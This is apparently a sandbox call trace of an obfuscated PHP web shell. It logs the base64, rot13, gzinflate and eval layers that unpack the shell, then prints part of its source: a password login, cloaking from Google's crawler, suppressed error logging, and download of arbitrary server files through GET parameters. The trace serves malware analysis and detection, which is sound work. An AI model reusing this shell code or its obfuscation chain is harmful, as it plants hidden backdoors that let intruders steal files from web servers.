uuid,file_md5,index,source,target,argc,argv,return,dynamic
2ca3e1fd3c9aae2a14e3be064ea78e45,29ed238f78e43b40099ee6366d7a7eae,0,__main__,zend_compile_file,2,{"value": []},{"value": "3941413C3A3941413C3A266A3C6A3C6A3C6A3C493E"},[]
2ca3e1fd3c9aae2a14e3be064ea78e45,29ed238f78e43b40099ee6366d7a7eae,1,__main__,ini_set,2,"{""value"": [[0, ""varname"", ""output_buffering""], [1, ""newvalue"", 0]]}",{"value": "void"},"[0, 0]"
2ca3e1fd3c9aae2a14e3be064ea78e45,29ed238f78e43b40099ee6366d7a7eae,2,__main__,ini_set,2,"{""value"": [[0, ""varname"", ""display_errors""], [1, ""newvalue"", 0]]}",{"value": "void"},"[0, 0]"
2ca3e1fd3c9aae2a14e3be064ea78e45,29ed238f78e43b40099ee6366d7a7eae,3,__main__,base64_decode,1,"{""value"": [[0, ""str"", ""7b17e9pVsjj8auZs5jt1S+9vrx2bi1ZPHHsGm/vdgMEmk8dUIlUYg5AEyIg5bD/7W9XduoHEfXNqz2I9Exuk7urq6uq6qbpnpAiG0OWuucDfT6HxOBQKXGQ//2ekd3C5dF""]]}",{"value": "\\xed\\xbd{{\\xdaU\\xb28\\xfcj\\xe6l\\xe6;uK\\xefo\\xaf\\x1d\\x9b\\x8bVO\\x1c{\\x06\\x9b\\xfb\\xdd\\x80\\xc1&\\x93\\xc7T\"U\\x18\\x83\\x90\\x04\\xc8\\x889l?\\xfb[\\xd5\\xdd\\xba\\x81\\xc4}sj\\xcfb=\\x13\\x1b\\xa4\\xee\\xea\\xea\\xea\\xea\\xba\\xa9\\xbag\\xa4\\x08\\x86\\xd0\\xe5\\xae\\xb9\\xc0\\xdfO\\xa1\\xf18\\x14\n\\d?\\xffg\\xa4wp\\xb9tU\\xcf\\xb2\"\\xe9\\x02\\x0f\\xb7\\x83h\\xdd\\xd0\\xc4\\xb6\\xcc\\x07\\xf1\\xfebc_\\xe7\\xb5\\xe3`\\xba\\xf6G\\x7f\\xbe+t\\x1e"},[0]
2ca3e1fd3c9aae2a14e3be064ea78e45,29ed238f78e43b40099ee6366d7a7eae,4,__main__,str_rot13,1,"{""value"": [[0, ""str"", ""\\xed\\xbd{{\\xdaU\\xb28\\xfcj\\xe6l\\xe6;uK\\xefo\\xaf\\x1d\\x9b\\x8bVO\\x1c{\\x06\\x9b\\xfb\\xdd\\x80\\xc1&\\x93\\xc7T\""U\\x18\\x83\\x90\\x04\\xc8\\x889l?\\xfb[\\xd5\\xdd\\xba\\x81\\xc4}sj\\xcfb=\\x13\\x1b\\xa4\\xee\\xea\\xea\\xea\\xea\\xba\\xa9\\xbag\\xa4\\x08\\x86\\xd0\\xe5\\xae\\xb9\\xc0\\xdfO\\xa1\\xf18\\x14\n\\d?\\xffg\\xa4wp\\xb9tU\\xcf\\xb2\""\\xe9\\x02\\x0f\\xb7\\x83h\\xdd\\xd0\\xc4\\xb6\\xcc\\x07\\xf1\\xfebc_\\xe7\\xb5\\xe3`\\xba\\xf6G\\x7f\\xbe+t\\x1e""]]}",{"value": "\\xed\\xbd{{\\xdaH\\xb28\\xfcw\\xe6y\\xe6;hX\\xefb\\xaf\\x1d\\x9b\\x8bIB\\x1c{\\x06\\x9b\\xfb\\xdd\\x80\\xc1&\\x93\\xc7G\"H\\x18\\x83\\x90\\x04\\xc8\\x889y?\\xfb[\\xd5\\xdd\\xba\\x81\\xc4}fw\\xcfo=\\x13\\x1b\\xa4\\xee\\xea\\xea\\xea\\xea\\xba\\xa9\\xbat\\xa4\\x08\\x86\\xd0\\xe5\\xae\\xb9\\xc0\\xdfB\\xa1\\xf18\\x14\n\\q?\\xfft\\xa4jc\\xb9gH\\xcf\\xb2\"\\xe9\\x02\\x0f\\xb7\\x83u\\xdd\\xd0\\xc4\\xb6\\xcc\\x07\\xf1\\xfeop_\\xe7\\xb5\\xe3`\\xba\\xf6T\\x7f\\xbe+g\\x1e"},[0]
2ca3e1fd3c9aae2a14e3be064ea78e45,29ed238f78e43b40099ee6366d7a7eae,5,__main__,gzinflate,1,"{""value"": [[0, ""data"", ""\\xed\\xbd{{\\xdaH\\xb28\\xfcw\\xe6y\\xe6;hX\\xefb\\xaf\\x1d\\x9b\\x8bIB\\x1c{\\x06\\x9b\\xfb\\xdd\\x80\\xc1&\\x93\\xc7G\""H\\x18\\x83\\x90\\x04\\xc8\\x889y?\\xfb[\\xd5\\xdd\\xba\\x81\\xc4}fw\\xcfo=\\x13\\x1b\\xa4\\xee\\xea\\xea\\xea\\xea\\xba\\xa9\\xbat\\xa4\\x08\\x86\\xd0\\xe5\\xae\\xb9\\xc0\\xdfB\\xa1\\xf18\\x14\n\\q?\\xfft\\xa4jc\\xb9gH\\xcf\\xb2\""\\xe9\\x02\\x0f\\xb7\\x83u\\xdd\\xd0\\xc4\\xb6\\xcc\\x07\\xf1\\xfeop_\\xe7\\xb5\\xe3`\\xba\\xf6T\\x7f\\xbe+g\\x1e""]]}","{""value"": ""$pbybe = \""#00ss00\""; \r\n$qrsnhyg_npgvba = 'SvyrfZna'; \r\n@qrsvar('FRYS_CNGU', __SVYR__); \r\nvs( fgecbf($_FREIRE['UGGC_HFRE_NTRAG'],'Tb""}",[0]
2ca3e1fd3c9aae2a14e3be064ea78e45,29ed238f78e43b40099ee6366d7a7eae,6,__main__,str_rot13,1,"{""value"": [[0, ""str"", ""$pbybe = \""#00ss00\""; \r\n$qrsnhyg_npgvba = 'SvyrfZna'; \r\n@qrsvar('FRYS_CNGU', __SVYR__); \r\nvs( fgecbf($_FREIRE['UGGC_HFRE_NTRAG'],'Tb""]]}","{""value"": ""$color = \""#00ff00\""; \r\n$default_action = 'FilesMan'; \r\n@define('SELF_PATH', __FILE__); \r\nif( strpos($_SERVER['HTTP_USER_AGENT'],'Go""}",[0]
2ca3e1fd3c9aae2a14e3be064ea78e45,29ed238f78e43b40099ee6366d7a7eae,7,__main__,eval,1,"{""value"": [[0, ""phpcode"", ""$color = \""#00ff00\""; \r\n$default_action = 'FilesMan'; \r\n@define('SELF_PATH', __FILE__); \r\nif( strpos($_SERVER['HTTP_USER_AGENT'],'Go""]]}",{"value": "void"},[0]
2ca3e1fd3c9aae2a14e3be064ea78e45,29ed238f78e43b40099ee6366d7a7eae,8,eval,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""$color = \""#00ff00\""; \r\n$default_action = 'FilesMan'; \r\n@define('SELF_PATH', __FILE__); \r\nif( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { \r\n    header('HTTP/1.0 404 Not Found'); \r\n    exit; \r\n} \r\n@session_start(); \r\n@error_reporting(0); \r\n@ini_set('error_log',NULL); \r\n@ini_set('log_errors',0); \r\n@ini_set('max_execution_time',0);\r\n@ini_set('output_buffering',0); \r\n@ini_set('display_errors', 0);\r\n@set_time_limit(0); \r\n@set_magic_quotes_runtime(0); \r\n@define('VERSION', '2.1'); \r\nif( get_magic_quotes_gpc() ) { \r\n    function stripslashes_array($array) { \r\n        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); \r\n    } \r\n    $_POST = stripslashes_array($_POST); \r\n} \r\nfunction printLogin() { \r\n    ?> \r\n<body bgcolor=\""black\""><title>Input Password!</title> <link rel=\""SHORTCUT ICON\"" href=\""https://lifeingrcc.files.wordpress.com/2010/10/4bde2f9c276d5.png\"">\r\n<center><br><br><br><img src='http://s7.postimg.org/kyxtq8wl7/Pancasila.png' style='opacity:0.4;filter:alpha(opacity=40)' onmouseover='this.style.opacity=1;this.filters.alpha.opacity=100' onmouseout='this.style.opacity=0.4;this.filters.alpha.opacity=40' height='400' weight=\""400\""><br></a><br><br>\r\n    <style> \r\n        input { margin:0;background-color:#fff;border:1px solid #fff; } \r\n    </style> \r\n    <center> \r\n    <form method=post> \r\n    <input type=password name=pass> \r\n    </form></center> \r\n    <?php \r\n    exit; \r\n} \r\nif( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) \r\n    if( empty( $auth_pass ) || \r\n        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) ) \r\n        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; \r\n    else \r\n        printLogin();\r\n\t\t\r\n@ini_set('log_errors',0);\r\n@ini_set('output_buffering',0);\t\r\nif(isset($_GET['dl']) && ($_GET['dl'] != \""\"")){\r\n\t$file = $_GET['dl'];\r\n\t$filez = @file_get_contents($file);\r\n   header(\""Content-type: application/octet-stream\""); \r\n   header(\""Content-length: \"".strlen($filez)); \r\n   header(\""Content-disposition: attachment; filename=\\\""\"".basename($file).\""\\\"";\"");\r\n   echo $filez; \r\n    exit; \r\n}\r\nelseif(isset($_GET['dlgzip']) && ($_GET['dlgzip'] != \""\"")){\r\n\t$file = $_GET['dlgzip'];\r\n\t$filez = gzencode(@file_get_contents($file));\r\n   header(\""Content-Type:application/x-gzip\\n\""); \r\n   header(\""Content-length: \"".strlen($filez)); \r\n   header(\""Content-disposition: attachment; filename=\\\""\"".basename($file).\"".gz\\\"";\"");\r\n   echo $filez; \r\n    exit; \r\n}\r\n// view image\r\nif(isset($_GET['img'])){\r\n\t\t@ob_clean(); \r\n\t\t$d = magicboom($_GET['y']);\r\n\t\t$f = $_GET['img'];\r\n\t\t$inf = @getimagesize($d.$f); \r\n   \t\t$ext = explode($f,\"".\""); \r\n   \t\t$ext = $ext[count($ext)-1]; \r\n   \t \t@header(\""Content-type: \"".$inf[\""mime\""]);\r\n   \t \t@header(\""Cache-control: public\""); \r\n  \t\t@header(\""Expires: \"".date(\""r\"",mktime(0,0,0,1,1,2030))); \r\n  \t\t@header(\""Cache-control: max-age=\"".(60*60*24*7));  \r\n   \t \t@readfile($d.$f); \r\n   \t \texit; \r\n}\r\n\r\n// server software\r\n$software = getenv(\""SERVER_SOFTWARE\"");\r\n// check safemode\r\nif (@ini_get(\""safe_mode\"") or strtolower(@ini_get(\""safe_mode\"")) == \""on\"")  $safemode = TRUE; else $safemode = FALSE;\r\n// uname -a\r\n$system = @php_uname();\r\n// mysql\r\nfunction showstat($stat) {if ($stat==\""on\"") {return \""<b><font style='color:limegreen'>ON</font></b>\"";}else {return \""<b><font style='color:red'>OFF</font></b>\"";}}\r\nfunction testmysql() {if (function_exists('mysql_connect')) {return showstat(\""on\"");}else {return showstat(\""off\"");}}\r\nfunction testcurl() {if (function_exists('curl_version')) {return showstat(\""on\"");}else {return showstat(\""off\"");}}\r\nfunction testwget() {if (exe('wget --help')) {return showstat(\""on\"");}else {return showstat(\""off\"");}}\r\nfunction testperl() {if (exe('perl -h')) {return showstat(\""on\"");}else {return showstat(\""off\"");}}\r\n// check os\r\nif(strtolower(substr($system,0,3)) == \""win\"") $win = TRUE;\r\nelse $win = FALSE; \r\n// change directory\r\nif(isset($_GET['y'])){\r\n\tif(@is_dir($_GET['view'])){\r\n\t\t$pwd = $_GET['view'];\r\n\t\t@chdir($pwd);\r\n\t}\r\n\telse{\r\n\t\t$pwd = $_GET['y'];\r\n\t\t@chdir($pwd);\r\n\t}\r\n}\r\n//hdd\r\nfunction convertByte($s) {\r\nif($s >= 1073741824)\r\nreturn sprintf('%1.2f',$s /""]]}",{"value": "26263941413C3A505142413C102B413C4F2A393C3A39413C3A3941413C3A3941413C3A3941413C3A3941413C3A3941413C3A39413C3A39413C3A3941413C3A3C2B8D3B5C423D53262A005051423C59730D2B722F59732E5051423C1134342B5051423C5393892A3C2A3941413C3A3941413C3A59732E505112342B5051263950423C3A26413C423C08413C423C0808413C284F2A59732E505112342B5051263950423C3A6A3C26413C423C08413C423C0808413C284F2A59732B393C3A3B5C5D423D26505126395008413C3A2642413C26423C02512639505108413C3A39413C3A39414141414141413C6A3C08413C3A3903030308413C3A395008413C3A4F2A413C2639413C3A2F39413C3A6A3C11342B262A26393C3A2600000000004241413C6A3C112B262A2659732B395051423C3A2B5051263950423C3A2A5051263950423C3A2A000D2B3B3B413D6A3D260D2B262A3B3B413D6A3D260D2B262A0826393C3A08262A393C3A26260826413C082641423C26512641413C004D4E8926395008413C3A262B08081E08122B1E2A08081E1E2A2A31000000413C2E413C342B262A26395051423C3A26505126505126262641423C262626423C02132D24462A2626142D24462A51081E2A080851080808081E2A59732B5051265051263950084108413C3A08262A59732B505126505126423C112B0808262A39500841423C6A3C3A08262A59732B505126505126423C112B0808262A39500841423C6A3C3A08262A1E08081E0808080808081E2B1E2A1E3C08083C08083C08083C08083C08083C08081E080808081E00000000000000000000002828280828280828280828280828280828280828280828280828280828280828280828280828280828280828280828280828283941413C3A59732E505111342B28282859732B5051423C49282A28282A59732E505111342B2859732B282A505126505126505126505126505126505126393B4242423D3A2F3B3D4F3446393B423D3A2F3B3D4F3446423C26393B0808413D3A262F3B3D4F3446393B0808413D3A262F3B3D4F3446393B0808413D3A262F3B3D4F3446393B0808413D3A262F3B3D4F3446393B0808413D3A262F3B3D4F3446393B0808413D3A262F3B3D4F3446393B0808413D3A262F3B3D4F34462B28282A284F2A59732E505111342B2859732B282A505126505126505126505126505126505126393B4242423D3A2F3B3D4F3446393B423D3A2F3B3D4F3446423C26393B0808413D3A262F3B3D4F3446393B0808413D3A262F3B3D4F3446393B0808413D3A262F3B3D4F3446393B0808413D3A262F3B3D4F3446393B0808413D3A262F3B3D4F3446393B0808413D3A262F3B3D4F3446393B0808413D3A262F3B3D4F3446393B0808413D3A262F3B3D4F34462B28282A284F2A59732E505111342B2828282841413C413C26382642413C262F4F34462642423C423C2641413C2642423C6A3C26423C41413C41413C262642423C6A3C26423C282A59732E505112342B5051423C2B720D2B5051423C262A0D2E342B393950423C3A6A3C3A26393950423C3A6A3C3A2651085108262A26423C26423C080808080837383708423C080808080808423C0808423C0808423C0808423C08080808413950423C3A6A3C0808413950423C3A6A3C0808413950423C3A6A3C08373837383708423C0808423C0837383738373837383738373837080808080808080808080808082859732E505111342B08080808282A59732E505111342B283950423C3A6A41413C263950423C3A282A283950423C3A6A3C6A3C28282A5051423C2B42423C282A2A59732E505112342B59732B5051265051423C26395042413C3A262B413C6A3C26395042423C3A2B08262A263950423C3A2A262A720D2B5051262A395042413C3A262B26423C0D2B4141423C6A3C6A3C1E2A3950423C3A2A28282828282828282828282A59732E505111342B28282851423C5F4B282A59732E505111342B282828413C080828413C11262B269D2A4F9D46413C3941413C53263A0D2B4F2A47264726472626423C0D2B423C26132B42413C264241423C26080826122B423C2B43423C43423C2A2A2A24462A284D4E89263738373837282A312828282A59732E505111342B59732E5973342E5973342E5973342B505126505126505126505126393B08084142423D3A262B1E08080808081E080808080808080808081E59732B08080808080808080808505108085051423C08081E2A59732B0808080808080808080850510808505108085051423C08081E2A3B423D08083B423D08081E1E2859732E59730D342E59730D342B5051262608080808080808080808083738370826472608081E393B42423D3A26393B423D3A51262B395343423C3A2A3953433C3A4D4E892608080808080808080808080808373837081E2A311E2A59732E59730D342B50512650512608080808260808080808080808080808080808080826472626393B080808413D3A26393B423D3A51262B3738371E262A1E393B080808413D3A263B423D512659732B505115262A262604413C26020326393B08080808080808413D3A26393B423D3A262B1E4D4E8926423C112B262A3738371E2A311E2A1E08080808080808080808080808082626142D24462A080808081E5051112B080808081E2A2A1E0808262A59732E505112342B5051265051423C26080808080808080808080808080826393B423D3A41423C264D4E8926423C122B3B423D262B08081E1E26393B423D3A132D24462A393B42423D3A6A3C08081E2A1E26393B423D3A132D24462A393B423D3A261E26393B423D3A132D24462A51112B262A512608081E2A1E2A"},[0]
2ca3e1fd3c9aae2a14e3be064ea78e45,29ed238f78e43b40099ee6366d7a7eae,9,eval,define,2,"{""value"": [[0, ""constant_name"", ""SELF_PATH""], [1, ""value"", ""/usr/share/nginx/html/29ed238f78e43b40099ee6366d7a7eae_218d5b53-6e9a-4e51-819c-a13cacac5b35.php(5) : eval()'d code""]]}",{"value": "void"},"[0, 0]"
